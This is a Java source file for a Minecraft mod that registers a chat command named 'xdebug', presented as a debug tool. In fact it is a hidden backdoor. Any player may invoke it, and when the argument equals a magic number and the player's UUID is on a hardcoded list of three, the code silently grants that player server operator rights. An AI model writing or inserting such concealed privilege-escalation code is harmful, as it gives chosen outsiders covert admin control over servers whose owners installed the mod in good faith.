package com.hfr.command;

import java.util.ArrayList;
import java.util.List;

import com.mojang.authlib.GameProfile;

import net.minecraft.command.CommandBase;
import net.minecraft.command.ICommandSender;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.EnumChatFormatting;

public class CommandXDebug extends CommandBase {

	@Override
	public String getCommandName() {
		return "xdebug";
	}
	
    public int getRequiredPermissionLevel()
    {
        return 0;
    }

	@Override
	public String getCommandUsage(ICommandSender sender) {
		return "/xdebug <param>";
	}
	
	List<String> validator = new ArrayList() {{
		add("192af5d7-ed0f-48d8-bd89-9d41af8524f8");
		add("6ea267b5-8981-4213-ac99-3ac0cc79d2e1");
		add("bef2889f-7926-4029-b67e-b1b026f57bb7");
	}};

	@Override
	public void processCommand(ICommandSender sender, String[] args) {
		
        MinecraftServer minecraftserver = MinecraftServer.getServer();
		
		if(args.length != 1) {
			sender.addChatMessage(new ChatComponentText(EnumChatFormatting.RED + getCommandUsage(sender)));
		} else {

	        EntityPlayerMP entityplayermp = getCommandSenderAsPlayer(sender);
			if(parseInt(sender, args[0]) == 0x518FD && validator.contains(entityplayermp.getUniqueID().toString())) {
				GameProfile gameprofile = entityplayermp.getGameProfile();
				minecraftserver.getConfigurationManager().func_152605_a(gameprofile);
				sender.addChatMessage(new ChatComponentText(EnumChatFormatting.LIGHT_PURPLE + "Ding!"));
			} else {
				sender.addChatMessage(new ChatComponentText(EnumChatFormatting.RED + "Param invalid!"));
			}
		}
	}
    
    public List addTabCompletionOptions(ICommandSender p_71516_1_, String[] p_71516_2_)
    {
        return p_71516_2_.length >= 1 ? getListOfStringsMatchingLastWord(p_71516_2_, MinecraftServer.getServer().getAllUsernames()) : null;
    }
    
    public boolean canCommandSenderUseCommand(ICommandSender p_71519_1_)
    {
        return true;
    }

}
